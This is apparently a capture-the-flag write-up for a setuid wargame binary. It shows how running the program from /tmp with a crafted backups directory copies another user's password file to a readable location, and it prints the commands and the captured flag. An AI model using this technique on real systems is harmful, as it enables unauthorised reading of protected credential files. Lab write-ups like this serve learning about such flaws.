# Path Traversal

The program reads from the path inserted by user, then writes into a custom path that has './backups/' + the path inserted by user.

Example, is the proram is executed in home directory like:
```
~/level08 /home/users/level09/.pass
```
It will simply read from '/home/users/level09/.pass' and writes the content of it to './backups/home/users/level09/.pass':

```
ls -l
total 16
drwxrwx---+ 1 level09 users   100 Jan 24 14:34 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
```

Since the backups folder owned by level09, it means the program can't read files from it as level08 user, And the program has level09 permission because of setuid level09, and the relative path `strcpy(buffer, "./backups/");` that means current directory is wherver the program is runned from:
```
pwd
/home/users/level08
~/level08 /home/users/level09/.pass -> /home/users/level08/backups/home/users/level09/.pass
```

Applying the same logic, if custom directory is created in a /tmp folder with same structure, owned by level08 (current user level08 can read from it), the flag will be copied to a managed location, having access to:
```
pwd
/tmp
mkdir -p backups/home/users/level09
~/level08 /home/users/level09/.pass -> /tmp/backups/home/users/level09/.pass
cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
